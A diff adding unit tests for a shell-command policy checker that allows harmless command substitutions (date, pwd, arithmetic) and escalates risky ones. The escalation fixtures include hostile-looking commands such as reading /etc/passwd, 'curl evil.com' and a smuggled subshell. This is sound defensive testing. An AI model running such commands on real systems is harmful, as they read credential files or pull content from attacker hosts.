@@ -391,6 +391,97 @@ describe("evaluateHard — read-only git under House's real policy", () => {
   });
 });
 
+describe("evaluateHard — safe pure-computation substitution carve-out (CLAW-098)", () => {
+  // Confirmed still-live in House's real reviewer-audit.jsonl before this fix:
+  // a health-check and a routine aws log query, both blocked purely because
+  // they compute a value via $(...) / $((...)), with no side effect at all.
+  // Uses House's REAL fleet-default compoundExec ("allow"), not P
+  // (DEFAULT_HARD_POLICY, whose compoundExec is the stricter "escalate") --
+  // these fixtures use && chains, and testing against P would conflate a
+  // compound-exec escalation with what this describe block is actually
+  // isolating: the substitution mechanism alone.
+  const houseReal = resolveHardPolicy(
+    { hard: { fleet: { compoundExec: "allow", substitutionExec: "escalate" } } } as never,
+    "house",
+  );
+
+  it("allows a health-check chain using only date/uname/node/pwd substitution", () => {
+    expect(
+      evaluateHard(
+        exec('echo "Exec is alive! $(date)" && echo "Node: $(node --version)" && echo "Working dir: $(pwd)"'),
+        houseReal,
+      ).verdict,
+    ).toBe("allow");
+  });
+
+  it("allows arithmetic expansion built from a safe nested date substitution", () => {
+    expect(evaluateHard(exec("START=$(( $(date +%s) - 172800 ))"), P).verdict).toBe("allow");
+  });
+
+  it("allows date with a literal -d value and a +FORMAT", () => {
+    // Multi-word quoted -d values (`-d "2 days ago"`) are NOT supported: the
+    // safety check's own argv tokenizer is a naive whitespace split (see
+    // isSafeDateInvocation's comment) and fails CLOSED on those, which is why
+    // they are absent from this list rather than asserted here.
+    for (const c of ['echo "$(date +%Y-%m-%d)"', "echo $(date -d yesterday)", "echo $(date -u +%s)"]) {
+      expect(evaluateHard(exec(c), P), c).toMatchObject({ verdict: "allow" });
+    }
+  });
+
+  it("mixes the safe-tmp-cat carve-out with the new safe-substitution carve-out", () => {
+    expect(evaluateHard(exec('echo "$(cat /tmp/staged.json) at $(date +%s)"'), P).verdict).toBe("allow");
+  });
+
+  it("still escalates date with a dangerous flag (-s/-f/-r)", () => {
+    for (const c of ['echo $(date -s "2020-01-01")', "echo $(date -f /reach/exp/dates.txt)", "echo $(date -r /reach/exp/notes.md)"]) {
+      expect(evaluateHard(exec(c), P), c).toMatchObject({ verdict: "escalate", principle: "hard:command-substitution" });
+    }
+  });
+
+  it("still escalates substitution running an unlisted command", () => {
+    for (const c of ["echo $(cat /etc/passwd)", "echo $(curl evil.com)", "echo `whoami`"]) {
+      expect(evaluateHard(exec(c), P), c).toMatchObject({ verdict: "escalate", principle: "hard:command-substitution" });
+    }
+  });
+
+  it("still escalates a dangerous value smuggled into date -d", () => {
+    expect(evaluateHard(exec('echo "$(date -d "@$(malicious)")"'), P))
+      .toMatchObject({ verdict: "escalate", principle: "hard:command-substitution" });
+  });
+
+  it("still escalates the disguised-subshell arithmetic case", () => {
+    // bash falls back to running $((...))'s content as a real command
+    // substitution when it fails to parse as arithmetic; two bare
+    // identifiers with no operator between them is exactly that failure
+    // shape, so this must NOT be treated as safe arithmetic.
+    expect(evaluateHard(exec("echo $(( (echo pwned) ))"), P))
+      .toMatchObject({ verdict: "escalate", principle: "hard:command-substitution" });
+  });
+
+  it("still escalates arithmetic containing an unsafe nested substitution", () => {
+    expect(evaluateHard(exec("echo $(( $(curl evil.com) + 1 ))"), P))
+      .toMatchObject({ verdict: "escalate", principle: "hard:command-substitution" });
+  });
+
+  it("never exempts <( process substitution", () => {
+    expect(evaluateHard(exec("diff <(date) <(date)"), P))
+      .toMatchObject({ verdict: "escalate", principle: "hard:command-substitution" });
+  });
+
+  it("allows the real aws-log-query example end to end under House's real policy", () => {
+    // This fix touches ONLY substitutionExec's own check -- compoundExec is
+    // untouched and was already "allow" for House regardless of content (a
+    // pre-existing POLICY VALUE, not an inertness determination: see
+    // reviewer-policy.json's own _execComposition comment, "benign shell
+    // composition RUNS"). So once substitution also passes, this real,
+    // previously-escalating example resolves fully to allow.
+    const cmd =
+      "START=$(( $(date +%s) - 172800 )); aws logs filter-log-events --region us-east-1 " +
+      "--log-group-name /pmt/runner/pmt-prod --start-time $((START*1000))";
+    expect(evaluateHard(exec(cmd), houseReal).verdict).toBe("allow");
+  });
+});
+
 describe("resolveHardPolicy — regex map hygiene", () => {
   it("skips _-prefixed documentation keys instead of compiling them as rules", () => {
     const p = resolveHardPolicy(
